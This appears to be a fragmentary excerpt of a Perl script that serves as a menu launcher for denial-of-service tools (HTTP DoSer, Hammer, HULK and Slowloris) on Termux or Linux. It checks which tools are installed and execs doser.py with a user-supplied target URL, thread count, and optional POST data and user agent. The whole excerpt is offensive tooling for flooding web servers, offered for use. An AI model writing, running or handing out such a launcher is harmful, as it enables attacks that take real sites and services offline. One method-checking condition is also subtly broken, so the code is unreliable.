...
sub termux_control{
my @termux_tools=("~/../usr/bin/go", "~/../usr/bin/python2", "~/../usr/bin/python3", "~/../usr/bin/perl", "~/../usr/bin/bash");
my @dos_tools=("doser/doser.py", "hammer/hammer.py", "hulk/hulk.go", "hulk/hulk.py", "slowloris/pyslowloris/slowloris.py", "slowloris/slowloris.pl/slowloris.pl");print color('white');
print "\nStart when everything is ready!\n";print color('magenta');
print "\nGo is ready!\n" if -e $termux_tools[0];
print "Python 2 is ready!\n" if -e $termux_tools[1];
print "Python 3 is ready!\n" if -e $termux_tools[2];
print "Perl is ready!\n" if -e $termux_tools[3];
print "Bash is ready!\n" if -e $termux_tools[4];print color('white');
print "\nGo is not ready.\n" if ! -e $termux_tools[0];
print "Python 2 is not ready.\n" if ! -e $termux_tools[1];
print "Python 3 is not ready.\n" if ! -e $termux_tools[2];
print "Perl is not ready.\n" if ! -e $termux_tools[3];
print "Bash is not ready.\n" if ! -e $termux_tools[4];print color ('red');
print "HTTP DoSer is not ready.\n" if ! -e $dos_tools[0];
print "Hammer is not ready.\n" if ! -e $dos_tools[1];
print "HULK (Go) is not ready.\n" if ! -e $dos_tools[2];
print "HULK (Python) is not ready.\n" if ! -e $dos_tools[3];
...
print" 9: About\n";
print" 0: Exit\n";
print" 'chkterm' command: Check requirements if you're in Termux (without apostrophes).\n";
print" 'chknormal' command: Check requirements if you're in a regular GNU/Linux distribution (without apostrophes).\n";
print color('green');
...
my $dos5=exec "python doser/doser.py -t $threadnumber -g $doserurl";
chomp $dos5;
}
elsif ($method eq "P"){
...
chomp $doserdata;
print "To stop, please try CTRL+C or kill the process, then re-execute the script to try again.\n";
my $dos5=exec "python doser/doser.py -t $threadnumber -p $doserurl -ah $doserua -d $doserdata";
chomp $dos5;
}
elsif ($method ne "P"||"G"){
rerun();
